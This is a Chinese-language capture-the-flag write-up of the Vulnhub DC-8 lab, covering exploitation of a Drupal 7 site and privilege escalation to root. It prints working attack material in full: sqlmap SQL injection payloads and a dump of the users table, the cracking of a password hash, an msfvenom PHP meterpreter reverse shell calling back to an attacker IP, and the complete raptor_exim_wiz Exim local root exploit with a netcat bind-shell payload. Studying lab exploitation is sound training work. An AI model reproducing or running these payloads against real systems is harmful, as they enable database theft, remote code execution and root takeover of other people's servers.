---
title: DC8 walk-through/learning notes
date: 2020-12-14 +0800
categories: [pentest-learning,Vulnhub]
tags: ctf
---

# 信息收集阶段

## 端口扫描和ssh的基本探索

netdiscover我们就不说了 毕竟已经是家常便饭

拿到地址 192.168.31.208

然后还是家常便饭一般的nmap

发现端口和服务

``` bash
$ nmap -A 192.168.31.208
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-07 03:08 EST
Nmap scan report for 192.168.31.208
Host is up (0.00067s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 35:a7:e6:c4:a8:3c:63:1d:e1:c0:ca:a3:66:bc:88:bf (RSA)
|   256 ab:ef:9f:69:ac:ea:54:c6:8c:61:55:49:0a:e7:aa:d9 (ECDSA)
|_  256 7a:b2:c6:87:ec:93:76:d4:ea:59:4b:1b:c6:e8:73:f2 (ED25519)
80/tcp open  http    Apache httpd
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache
|_http-title: Welcome to DC-8 | DC-8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.65 seconds
```

根据作者在vulnhub留下的信息 bypass 2fa 我们检查了一下ssh

果不其然一链接上ssh端口就发现了verification code这种问题

这里我们微微跑一跑msf的 一些检查比如
```
use auxiliary/scanner/ssh/libssh_auth_bypass
[+] 192.168.31.208:22     - SSH server version: SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u1 ( service.version=7.4p1 openssh.comment=Debian-10+deb9u1 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH service.cpe23=cpe:/a:openbsd:openssh:7.4p1 os.vendor=Debian os.family=Linux os.product=Linux os.version=9.0 os.cpe23=cpe:/o:debian:debian_linux:9.0 service.protocol=ssh fingerprint_db=ssh.banner )
[*] 192.168.31.208:22     - Scanned 1 of 1 hosts (100% complete)
```

基本确认了是一个drupal 7 的 cms

外露了一个ssh 一个apache 一个drupal

此外他的robots也是有很多信息的 他外露了他的CHANGELOG 可以获知一些更新啊版本啊安全之类的等等 下一阶段我们将重点排查这些url


## 基本的一些检查

这时候我们可以访问网页，进行下一步的基本探索。可以看到一个durpal

CHANGELOG显示是一个7.68

如果你运行一些命令类似于

```
droopscan drupal scan http://192.168.31.208/ 
```

你也会得到对应的版本

我们可以去drupal的官网中查询相关的issue 尤其是security的相关issue

但是这里我们找不到任何可以利用的安全漏洞

接下来接着探索我们网站

我们发现他的每一个子网页的分支命名方法是/node/[number]

如果我们输入 

```
/node/[number]'
```

我们并不能得到任何错误 只有page no found

但是在查看网页源代码的时候 我们会发现一个有趣的url
```
/?nid=1
```

这样一个url 看起来像是一种数据库查询 用来对应的节点id来查询对应的网页地址

在1的后面加上单引号  我们直接就触发了 http 5XX 

并且返回了sql语句语法错误的提示

现在我们基本有思路了 sqlmap 起飞！

# sqlmap的抛瓦


```
$ sqlmap -u  http://192.168.31.208/?nid=1
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.11#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:06:17 /2020-12-07/

[04:06:17] [INFO] testing connection to the target URL
[04:06:17] [INFO] testing if the target URL content is stable
[04:06:17] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
C
[04:06:22] [INFO] testing if GET parameter 'nid' is dynamic
[04:06:22] [WARNING] GET parameter 'nid' does not appear to be dynamic
[04:06:22] [INFO] heuristic (basic) test shows that GET parameter 'nid' might be injectable (possible DBMS: 'MySQL')
[04:06:22] [INFO] testing for SQL injection on GET parameter 'nid'
Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[04:06:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:06:29] [WARNING] reflective value(s) found and filtering out
[04:06:30] [INFO] GET parameter 'nid' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Status message")
[04:06:30] [INFO] testing 'Generic inline queries'
[04:06:30] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:06:30] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:06:30] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:06:30] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:06:30] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:06:30] [WARNING] potential permission problems detected ('command denied')
[04:06:30] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[04:06:30] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[04:06:30] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[04:06:30] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:06:30] [INFO] GET parameter 'nid' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable                                                                                                           
[04:06:30] [INFO] testing 'MySQL inline queries'
[04:06:30] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:06:30] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)             
[04:06:30] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:06:30] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:06:30] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:06:30] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[04:06:30] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[04:06:30] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:06:40] [INFO] GET parameter 'nid' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:06:40] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:06:40] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:06:40] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:06:40] [INFO] target URL appears to have 1 column in query
[04:06:40] [INFO] GET parameter 'nid' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'nid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
---
Parameter: nid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: nid=1 AND 8987=8987

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: nid=1 AND (SELECT 1423 FROM(SELECT COUNT(*),CONCAT(0x716b766a71,(SELECT (ELT(1423=1423,1))),0x717a786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: nid=1 AND (SELECT 5677 FROM (SELECT(SLEEP(5)))tnIs)

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: nid=-2257 UNION ALL SELECT CONCAT(0x716b766a71,0x554a565070466579745a47744a596c54484e42427443756b6f74517a584f4e685957576d47465968,0x717a786271)-- -
---
[04:06:50] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[04:06:50] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 25 times
[04:06:50] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.31.208'

[*] ending @ 04:06:50 /2020-12-07

```

果不其然 我们抓到了sql的漏洞 error base and union query

这样进一步的使用我们的sqlmap

经过手动查找information_schena 或者直接dump数据库结构

我们可以得到以下信息

```
sqlmap -u http://192.168.31.208/?nid=1 --sql-shell
		
> select uid,name,pass from users [3]:                                                                                    
[*] 0, , 
[*] 1, admin, $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z
[*] 2, john, $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF

```

接下来把密码hash保存到本地

甚至username都在提示我们使用john


```bash
john pass # pass是一个保存密码的文本文件

#output:'john' pass is turtle
```
# 准备pump shell

接着检查网页

寻找一些可以上传可执行文件或者 online 动态添加code的地方
 
很好contract中的webform setting我们可以进行编辑和处理 

我们可以编辑php代码

这时传输一些 php meterpreter shell 上去吧
```php
$ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.31.141 lport=4444
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1115 bytes
/*<?php /**/ error_reporting(0); $ip = '192.168.31.141'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();

```

# SHELL&PWNED!

## SHELL

于是打开msfconsole 借用他的multi handler 
```
set payload php/meterpreter/reverse_tcp
set lhost 192.168.31.141
set lport 4444
run
```

这里并不是简简单单的直接打开node/3这个网页 而是需要发送一封邮件 然后发送成功之后 才会弹出我们的meterpreter

成功链接！---

sudo 指令执行之后 发现需要密码 所以sudo 提权 pass

第二步 检查suid 提权限

``` bash
www-data@dc-8:/var/www/html/profiles$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/newgrp
/usr/sbin/exim4
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/ping
/bin/su
/bin/umount
/bin/mount
```

这里我们除了几个常规的suid 我们还发现了一个不正常的exim4

我们来康康这是啥？

在运行 exim4 指令之后

第一句话就告诉我们了 这是一个mail服务

输出一下版本号看看 哦？2017年的老古董？

``` bash
eim4 --version
Exim version 4.89 #2 built 14-Jun-2017 05:03:07
Copyright (c) University of Cambridge, 1995 - 2017
(c) The Exim Maintainers and contributors in ACKNOWLEDGMENTS file, 2007 - 2017
Berkeley DB: Berkeley DB 5.3.28: (September  9, 2013)
Support for: crypteq iconv() IPv6 GnuTLS move_frozen_messages DKIM DNSSEC Event OCSP PRDR SOCKS TCP_Fast_Open
Lookups (built-in): lsearch wildlsearch nwildlsearch iplsearch cdb dbm dbmjz dbmnz dnsdb dsearch nis nis0 passwd
Authenticators: cram_md5 plaintext
Routers: accept dnslookup ipliteral manualroute queryprogram redirect
Transports: appendfile/maildir/mailstore autoreply lmtp pipe smtp
Fixed never_users: 0
Configure owner: 0:0
Size of off_t: 8
Configuration file is /var/lib/exim4/config.autogenerated
```
我们知道了 version is 4.89

接下来 就是检索一下 searchsploit

```bash
$ searchsploit exim 4.89
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Exim 4.87 < 4.91 - (Local / Remote) Command E | linux/remote/46974.txt
Exim 4.89 - 'BDAT' Denial of Service          | multiple/dos/43184.txt
Exim < 4.90.1 - 'base64d' Remote Code Executi | linux/remote/44571.py
PHPMailer < 5.2.20 with Exim MTA - Remote Cod | php/webapps/42221.py
---------------------------------------------- ---------------------------------
Shellcodes: No Results
```

一番检查和尝试之后 发现这里的好像第一条是适用的

```
#cat这个txt文件之后有一段话 

Because expand_string() recognizes the "${run{<command> <args>}}"
expansion item, and because new->address is the recipient of the mail
that is being delivered, a local attacker can simply send a mail to
"${run{...}}@localhost" (where "localhost" is one of Exim's
local_domains) and execute arbitrary commands, as root
(deliver_drop_privilege is false, by default):

[...]
```

同理这里有exploit-db的sh exp 

https://www.exploit-db.com/exploits/46996

较为棘手的事情是我们并不能在/var/www/html文件夹中写入文件

这对我一开始的提取权限造成了一定的障碍

但是没有关系 只要我们把exp写在/tmp文件夹下 （这里是所有用户都可以写的一个文件夹） 所以写进去exp才会万无一失。


>甚至一开始我还想要查找一个能有写入权限的文件夹
>
>```bash
>
>find / -perm -u=w -type d 2>/dev/null
>```
>

## root!

仔细调阅文件之后 发现是exim的code中

expand_string()可以识别“ ${run {<command> <args>}}”扩展项，

并且因为new-> address是要发送的邮件的收件人，

所以本地攻击者可以简单地将邮件发送到“ $ {run {...}} @ localhost“

(其中“ localhost”是Exim的local_domains之一)

并以root身份执行任意命令

(而且默认情况下，deliver_drop_privilege为false)

//特别是它有suid位 也可以知道他具有这种高权限

上code！

``` Bash
# exp part 
METHOD="setuid" # default method
PAYLOAD_SETUID='${run{\x2fbin\x2fsh\t-c\t\x22chown\troot\t\x2ftmp\x2fpwned\x3bchmod\t4755\t\x2ftmp\x2fpwned\x22}}@localhost'
PAYLOAD_NETCAT='${run{\x2fbin\x2fsh\t-c\t\x22nc\t-lp\t31337\t-e\t\x2fbin\x2fsh\x22}}@localhost'

# usage instructions
function usage()
{
	echo "$0 [-m METHOD]"
	echo
	echo "-m setuid : use the setuid payload (default)"
	echo "-m netcat : use the netcat payload"
	echo
	exit 1
}

# payload delivery
function exploit()
{
	# connect to localhost:25
	exec 3<>/dev/tcp/localhost/25
		#这里是核心代码
	# deliver the payload
	read -u 3 && echo $REPLY
	echo "helo localhost" >&3
	read -u 3 && echo $REPLY
	echo "mail from:<>" >&3
	read -u 3 && echo $REPLY
		#这里执行了我们的payload payload是上面列出的两个payload其中之一
	echo "rcpt to:<$PAYLOAD>" >&3
	
	read -u 3 && echo $REPLY
	echo "data" >&3
	read -u 3 && echo $REPLY
	for i in {1..31}
	do
		echo "Received: $i" >&3
	done
	echo "." >&3
	read -u 3 && echo $REPLY
	echo "quit" >&3
	read -u 3 && echo $REPLY
}

# print banner
echo
echo 'raptor_exim_wiz - "The Return of the WIZard" LPE exploit'
echo 'Copyright (c) 2019 Marco Ivaldi <raptor@0xdeadbeef.info>'
echo

# parse command line
while [ ! -z "$1" ]; do
	case $1 in
		-m) shift; METHOD="$1"; shift;;
		* ) usage
		;;
	esac
done
if [ -z $METHOD ]; then
	usage
fi

# setuid method
if [ $METHOD = "setuid" ]; then

	# prepare a setuid shell helper to circumvent bash checks
	echo "Preparing setuid shell helper..."
	echo "main(){setuid(0);setgid(0);system(\"/bin/sh\");}" >/tmp/pwned.c
	gcc -o /tmp/pwned /tmp/pwned.c 2>/dev/null
	if [ $? -ne 0 ]; then
		echo "Problems compiling setuid shell helper, check your gcc."
		echo "Falling back to the /bin/sh method."
		cp /bin/sh /tmp/pwned
	fi
	echo

	# select and deliver the payload
	echo "Delivering $METHOD payload..."
	PAYLOAD=$PAYLOAD_SETUID
	exploit
	echo

	# wait for the magic to happen and spawn our shell
	echo "Waiting 5 seconds..."
	sleep 5
	ls -l /tmp/pwned
	/tmp/pwned

# netcat method
elif [ $METHOD = "netcat" ]; then

	# select and deliver the payload
	echo "Delivering $METHOD payload..."
	PAYLOAD=$PAYLOAD_NETCAT
	exploit
	echo

	# wait for the magic to happen and spawn our shell
	echo "Waiting 5 seconds..."
	sleep 5 # 这里是等待有邮件发出 此外 一定要等到提示链接上 127.0.0.1 再进行操作
# 这个root非常的脆弱 因为是netcat建立起来的shell 一有错误就会立马崩溃 只能重新运行。
	nc -v 127.0.0.1 31337

# print help
else
	usage
fi

```

如果您使用的是下载下来的shell脚本来进行命令的本地权限提升

那么可能会遇到以下问题 尤其是在使用sh执行的时候 

报错也是摸不着头脑

exp的文本格式是 dos文件的格式 然后linux的格式是不能跑的

因为dos格式编写的是 CRLF 而mac是CR unix是LF

所以多出来的CR \r会导致命令执行错误 并且 在检查文件的时候 并不会看到
（这种字符是不可见的非打印字符）

```bash
sed -i 's/\r//' e.sh

# or use the 
# vim 中的
:set ff=unix
:set fileformat=unix
```

shell是不能执行这个sh脚本

但是bash可以 （这我也不明白为什么）（本地的suid提权是失败的 whoami之后 仍然是www-data用户

只能使用netcat 但是netcat root shell又非常脆弱 一旦命令错误便要再次执行

# PWN sueccess 欣赏一下 flag～～


``` bash
bash e.sh -m netcat

raptor_exim_wiz - "The Return of the WIZard" LPE exploit
Copyright (c) 2019 Marco Ivaldi <raptor@0xdeadbeef.info>

Delivering netcat payload...
220 dc-8 ESMTP Exim 4.89 Mon, 14 Dec 2020 16:12:30 +1000
250 dc-8 Hello localhost [::1]
250 OK
250 Accepted
354 Enter message, ending with "." on a line by itself
250 OK id=1koh5y-0001gB-RR
221 dc-8 closing connection

Waiting 5 seconds...
localhost [127.0.0.1] 31337 (?) open
ls
db
gnutls-params-2048
input
msglog
whoami
root
ls
db
gnutls-params-2048
input
msglog
cd /root
ls
flag.txt
cat flag.txt








Brilliant - you have succeeded!!!



888       888          888 888      8888888b.                             888 888 888 888
888   o   888          888 888      888  "Y88b                            888 888 888 888
888  d8b  888          888 888      888    888                            888 888 888 888
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888
888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "
888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888



Hope you enjoyed DC-8.  Just wanted to send a big thanks out there to all those
who have provided feedback, and all those who have taken the time to complete these little
challenges.

I'm also sending out an especially big thanks to:

@4nqr34z
@D4mianWayne
@0xmzfr
@theart42

This challenge was largely based on two things:

1. A Tweet that I came across from someone asking about 2FA on a Linux box, and whether it was worthwhile.
2. A suggestion from @theart42

The answer to that question is...

If you enjoyed this CTF, send me a tweet via @DCAU7.



```


Thankyou for your watching.

May some day see you at the other side of rainbow



